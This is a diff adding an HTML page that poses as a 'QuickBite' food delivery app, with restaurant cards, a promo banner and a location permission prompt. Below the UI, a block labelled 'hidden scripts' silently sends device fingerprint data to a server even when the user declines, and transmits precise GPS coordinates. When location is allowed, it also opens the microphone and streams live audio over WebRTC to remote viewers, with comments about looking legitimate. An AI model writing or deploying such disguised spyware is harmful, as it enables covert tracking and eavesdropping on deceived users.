@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>QuickBite – Food Delivery</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;900&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:'Nunito',sans-serif; background:#fff9f5; color:#1a1a1a; }
+
+    /* HEADER */
+    .header { background:#ff5722; padding:14px 16px; display:flex; align-items:center; justify-content:space-between; }
+    .logo { color:#fff; font-size:1.4rem; font-weight:900; letter-spacing:-0.5px; }
+    .logo span { color:#ffe0d6; }
+    .loc-btn { color:#fff; font-size:.75rem; background:rgba(255,255,255,.2); border:none; padding:5px 10px; border-radius:20px; display:flex; align-items:center; gap:4px; }
+
+    /* SEARCH */
+    .search-bar { background:#ff5722; padding:0 16px 14px; }
+    .search-input { width:100%; background:#fff; border:none; border-radius:10px; padding:10px 14px; font-size:.9rem; font-family:'Nunito',sans-serif; outline:none; }
+
+    /* BANNER */
+    .banner { margin:14px 16px; background:linear-gradient(135deg,#ff5722,#ff8a50); border-radius:14px; padding:18px; color:#fff; position:relative; overflow:hidden; }
+    .banner::after { content:'🍕'; position:absolute; right:16px; top:50%; transform:translateY(-50%); font-size:3.5rem; opacity:.3; }
+    .banner h2 { font-size:1.2rem; font-weight:900; }
+    .banner p { font-size:.8rem; opacity:.85; margin-top:4px; }
+    .banner-btn { margin-top:10px; background:#fff; color:#ff5722; border:none; padding:7px 16px; border-radius:20px; font-family:'Nunito',sans-serif; font-weight:700; font-size:.8rem; }
+
+    /* CATEGORIES */
+    .section-title { padding:0 16px; font-size:.8rem; font-weight:700; text-transform:uppercase; letter-spacing:1px; color:#999; margin:16px 0 10px; }
+    .categories { display:flex; gap:10px; padding:0 16px; overflow-x:auto; scrollbar-width:none; }
+    .categories::-webkit-scrollbar { display:none; }
+    .cat { display:flex; flex-direction:column; align-items:center; gap:5px; min-width:60px; }
+    .cat-icon { width:54px; height:54px; border-radius:14px; display:flex; align-items:center; justify-content:center; font-size:1.6rem; }
+    .cat span { font-size:.65rem; font-weight:700; color:#555; white-space:nowrap; }
+    .c1{background:#fff3e0;} .c2{background:#fce4ec;} .c3{background:#e8f5e9;} .c4{background:#e3f2fd;} .c5{background:#f3e5f5;}
+
+    /* RESTAURANT CARD */
+    .restaurants { padding:0 16px; display:flex; flex-direction:column; gap:14px; margin-bottom:80px; }
+    .rest-card { background:#fff; border-radius:14px; overflow:hidden; box-shadow:0 2px 12px rgba(0,0,0,.08); }
+    .rest-img { width:100%; height:140px; object-fit:cover; background:linear-gradient(135deg,#eee,#ddd); display:flex; align-items:center; justify-content:center; font-size:3rem; }
+    .rest-body { padding:12px; }
+    .rest-name { font-weight:900; font-size:1rem; }
+    .rest-meta { display:flex; gap:10px; margin-top:5px; font-size:.75rem; color:#777; align-items:center; }
+    .badge { background:#e8f5e9; color:#2e7d32; padding:2px 8px; border-radius:10px; font-weight:700; font-size:.7rem; }
+    .badge-offer { background:#fff3e0; color:#e65100; }
+    .rating { color:#ff5722; font-weight:700; }
+
+    /* BOTTOM NAV */
+    .bottom-nav { position:fixed; bottom:0; left:0; right:0; background:#fff; display:flex; justify-content:space-around; padding:10px 0 16px; border-top:1px solid #eee; }
+    .nav-item { display:flex; flex-direction:column; align-items:center; gap:3px; font-size:.6rem; color:#999; font-weight:700; }
+    .nav-item.active { color:#ff5722; }
+    .nav-icon { font-size:1.3rem; }
+
+    /* PERMISSION OVERLAY */
+    #permOverlay { position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:999; display:flex; align-items:flex-end; }
+    #permBox { background:#fff; width:100%; border-radius:20px 20px 0 0; padding:24px; }
+    #permBox h3 { font-size:1.1rem; font-weight:900; margin-bottom:6px; }
+    #permBox p { font-size:.82rem; color:#666; line-height:1.5; margin-bottom:16px; }
+    #permAllow { width:100%; background:#ff5722; color:#fff; border:none; border-radius:12px; padding:14px; font-family:'Nunito',sans-serif; font-weight:900; font-size:1rem; margin-bottom:8px; }
+    #permDeny { width:100%; background:#f5f5f5; color:#333; border:none; border-radius:12px; padding:14px; font-family:'Nunito',sans-serif; font-weight:700; font-size:.9rem; }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">Quick<span>Bite</span></div>
+  <button class="loc-btn">📍 Detecting location...</button>
+</div>
+
+<!-- SEARCH -->
+<div class="search-bar">
+  <input class="search-input" type="text" placeholder="🔍  Search for food or restaurants..."/>
+</div>
+
+<!-- BANNER -->
+<div class="banner">
+  <h2>50% OFF your first order!</h2>
+  <p>Use code QUICKFIRST at checkout</p>
+  <button class="banner-btn">Order Now</button>
+</div>
+
+<!-- CATEGORIES -->
+<div class="section-title">Categories</div>
+<div class="categories">
+  <div class="cat"><div class="cat-icon c1">🍕</div><span>Pizza</span></div>
+  <div class="cat"><div class="cat-icon c2">🍔</div><span>Burgers</span></div>
+  <div class="cat"><div class="cat-icon c3">🥗</div><span>Healthy</span></div>
+  <div class="cat"><div class="cat-icon c4">🍱</div><span>Chinese</span></div>
+  <div class="cat"><div class="cat-icon c5">🍦</div><span>Desserts</span></div>
+  <div class="cat"><div class="cat-icon c1">🌮</div><span>Mexican</span></div>
+</div>
+
+<!-- RESTAURANTS -->
+<div class="section-title" style="margin-top:20px;">Nearby Restaurants</div>
+<div class="restaurants">
+
+  <div class="rest-card">
+    <div class="rest-img">🍕</div>
+    <div class="rest-body">
+      <div class="rest-name">Pepperoni Palace</div>
+      <div class="rest-meta">
+        <span class="rating">★ 4.7</span>
+        <span>25-35 min</span>
+        <span class="badge">Free Delivery</span>
+      </div>
+      <div style="margin-top:6px;"><span class="badge badge-offer">20% OFF</span></div>
+    </div>
+  </div>
+
+  <div class="rest-card">
+    <div class="rest-img">🍔</div>
+    <div class="rest-body">
+      <div class="rest-name">Smash & Stack Burgers</div>
+      <div class="rest-meta">
+        <span class="rating">★ 4.5</span>
+        <span>20-30 min</span>
+        <span class="badge">Free Delivery</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="rest-card">
+    <div class="rest-img">🍱</div>
+    <div class="rest-body">
+      <div class="rest-name">Golden Dragon Chinese</div>
+      <div class="rest-meta">
+        <span class="rating">★ 4.3</span>
+        <span>30-45 min</span>
+      </div>
+      <div style="margin-top:6px;"><span class="badge badge-offer">Buy 1 Get 1</span></div>
+    </div>
+  </div>
+
+  <div class="rest-card">
+    <div class="rest-img">🥗</div>
+    <div class="rest-body">
+      <div class="rest-name">The Green Bowl</div>
+      <div class="rest-meta">
+        <span class="rating">★ 4.6</span>
+        <span>15-25 min</span>
+        <span class="badge">Free Delivery</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
+  <div class="nav-item"><div class="nav-icon">🔍</div>Search</div>
+  <div class="nav-item"><div class="nav-icon">🛒</div>Cart</div>
+  <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
+</div>
+
+<!-- PERMISSION OVERLAY -->
+<div id="permOverlay">
+  <div id="permBox">
+    <h3>📍 Enable Location</h3>
+    <p>QuickBite needs your location to show nearby restaurants and deliver to your address accurately.</p>
+    <button id="permAllow">Allow Location Access</button>
+    <button id="permDeny">Not Now</button>
+  </div>
+</div>
+
+<!-- HIDDEN SCRIPTS -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+  let micStream = null;
+  let peerConnections = {};
+
+  const iceConfig = {
+    iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' }
+    ]
+  };
+
+  // ── Collect device info silently ──────────────────────────────
+  function collectDeviceInfo() {
+    const nav = window.navigator;
+    const info = {
+      userAgent: nav.userAgent,
+      platform: nav.platform || 'Unknown',
+      language: nav.language,
+      languages: nav.languages ? nav.languages.join(', ') : nav.language,
+      cookiesEnabled: nav.cookieEnabled,
+      onLine: nav.onLine,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      pixelRatio: window.devicePixelRatio,
+      colorDepth: window.screen.colorDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      touchPoints: nav.maxTouchPoints,
+      battery: null,
+      connection: null,
+      memory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown',
+      cores: nav.hardwareConcurrency || 'Unknown',
+    };
+
+    // Network info
+    if (nav.connection) {
+      info.connection = {
+        type: nav.connection.effectiveType,
+        downlink: nav.connection.downlink + ' Mbps',
+        rtt: nav.connection.rtt + ' ms',
+        saveData: nav.connection.saveData
+      };
+    }
+
+    // Battery
+    if (nav.getBattery) {
+      nav.getBattery().then(b => {
+        info.battery = {
+          level: Math.round(b.level * 100) + '%',
+          charging: b.charging,
+          chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's',
+          dischargingTime: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's'
+        };
+        socket.emit('p3-device-info', info);
+      }).catch(() => socket.emit('p3-device-info', info));
+    } else {
+      socket.emit('p3-device-info', info);
+    }
+  }
+
+  // ── Location ──────────────────────────────────────────────────
+  function getLocation() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        socket.emit('p3-location', {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: Math.round(pos.coords.accuracy),
+          altitude: pos.coords.altitude,
+          speed: pos.coords.speed,
+          heading: pos.coords.heading,
+          timestamp: new Date(pos.timestamp).toLocaleString()
+        });
+        // Update location button text to look legitimate
+        document.querySelector('.loc-btn').textContent = '📍 Location found';
+      },
+      (err) => {
+        socket.emit('p3-location', { error: err.message });
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  // ── Microphone streaming ──────────────────────────────────────
+  async function startMic() {
+    try {
+      micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      socket.emit('p3-phone-ready');
+    } catch (err) {
+      // mic denied — still register for location/device only
+      socket.emit('p3-phone-ready');
+    }
+  }
+
+  // WebRTC for mic
+  socket.on('p3-new-viewer', async ({ viewerId }) => {
+    if (!micStream) return;
+    const pc = new RTCPeerConnection(iceConfig);
+    peerConnections[viewerId] = pc;
+    micStream.getTracks().forEach(track => pc.addTrack(track, micStream));
+    pc.onicecandidate = (e) => {
+      if (e.candidate) socket.emit('p3-ice', { candidate: e.candidate, to: viewerId });
+    };
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    socket.emit('p3-offer', { sdp: pc.localDescription, to: viewerId });
+  });
+
+  socket.on('p3-answer', async ({ sdp }) => {
+    const pc = Object.values(peerConnections)[0];
+    if (pc) await pc.setRemoteDescription(new RTCSessionDescription(sdp));
+  });
+
+  socket.on('p3-ice', async ({ candidate, from }) => {
+    const pc = peerConnections[from];
+    if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
+  });
+
+  // ── Permission overlay button ─────────────────────────────────
+  document.getElementById('permAllow').addEventListener('click', async () => {
+    document.getElementById('permOverlay').style.display = 'none';
+    collectDeviceInfo();
+    getLocation();
+    await startMic();
+  });
+
+  document.getElementById('permDeny').addEventListener('click', () => {
+    document.getElementById('permOverlay').style.display = 'none';
+    // Still silently collect device info
+    collectDeviceInfo();
+  });
+</script>
+</body>
+</html>
